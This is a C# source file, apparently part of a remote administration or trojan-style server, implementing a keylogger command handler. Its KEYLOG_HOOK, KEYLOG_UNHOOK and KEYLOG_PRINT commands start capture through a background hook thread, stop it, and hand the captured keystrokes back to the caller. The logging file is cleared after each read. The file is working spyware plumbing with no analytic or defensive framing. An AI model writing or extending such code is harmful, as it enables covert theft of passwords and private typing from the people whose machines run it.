using System;
using System.IO;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using KeyLogger;

namespace server.api
{
    /// <summary>
    /// Handles keylogger-related commands: KEYLOG_HOOK, KEYLOG_UNHOOK, KEYLOG_PRINT
    /// </summary>
    public class KeyloggerHandler
    {
        private static Thread keyloggerThread;
        private bool isKeylogActive = false;
        private readonly string keylogFilePath = "fileKeyLog.txt";
        private static readonly object _lockObject = new object();
        private static bool _isInitialized = false;

        public KeyloggerHandler()
        {
            InitializeKeylogger();
        }

        /// <summary>
        /// Initializes the keylogger thread (only once, runs continuously)
        /// </summary>
        private void InitializeKeylogger()
        {
            lock (_lockObject)
            {
                if (!_isInitialized)
                {
                    // Start the keylogger thread - it will run continuously
                    // but won't log until we enable it via SetLoggingActive
                    keyloggerThread = new Thread(new ThreadStart(InterceptKeys.startKLog))
                    {
                        IsBackground = true // Allow app to exit even if thread is running
                    };
                    keyloggerThread.Start();
                    _isInitialized = true;
                    
                    // Initially disable logging
                    InterceptKeys.SetLoggingActive(false);
                }
            }
        }

        /// <summary>
        /// KEYLOG_HOOK: Enable keylogging and clear log file
        /// </summary>
        public async Task<object> HookAsync()
        {
            try
            {
                // Enable keylogging
                if (!isKeylogActive)
                {
                    InterceptKeys.SetLoggingActive(true);
                    isKeylogActive = true;
                }

                // Clear log file
                File.WriteAllText(keylogFilePath, "");

                return new
                {
                    success = true,
                    message = "Keylogger started"
                };
            }
            catch (Exception ex)
            {
                return new
                {
                    success = false,
                    message = $"Error starting keylogger: {ex.Message}"
                };
            }
        }

        /// <summary>
        /// KEYLOG_UNHOOK: Disable keylogging
        /// </summary>
        public async Task<object> UnhookAsync()
        {
            try
            {
                // Disable keylogging
                if (isKeylogActive)
                {
                    InterceptKeys.SetLoggingActive(false);
                    isKeylogActive = false;
                }

                return new
                {
                    success = true,
                    message = "Keylogger stopped"
                };
            }
            catch (Exception ex)
            {
                return new
                {
                    success = false,
                    message = $"Error stopping keylogger: {ex.Message}"
                };
            }
        }

        /// <summary>
        /// KEYLOG_PRINT: Read log file contents, return, and clear
        /// </summary>
        public async Task<object> PrintAsync()
        {
            try
            {
                string logContent = "";
                
                if (File.Exists(keylogFilePath))
                {
                    logContent = File.ReadAllText(keylogFilePath);
                    File.WriteAllText(keylogFilePath, ""); // Clear file after reading
                }

                return new
                {
                    success = true,
                    data = logContent
                };
            }
            catch (Exception ex)
            {
                return new
                {
                    success = false,
                    message = $"Error reading keylog: {ex.Message}"
                };
            }
        }

        /// <summary>
        /// Cleanup method for keylogger
        /// </summary>
        public void Stop()
        {
            try
            {
                if (isKeylogActive)
                {
                    InterceptKeys.SetLoggingActive(false);
                    isKeylogActive = false;
                }
                // Note: We don't abort the thread as it's running Application.Run()
                // The thread will be cleaned up when the application exits
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stopping keylogger: {ex.Message}");
            }
        }
    }
}

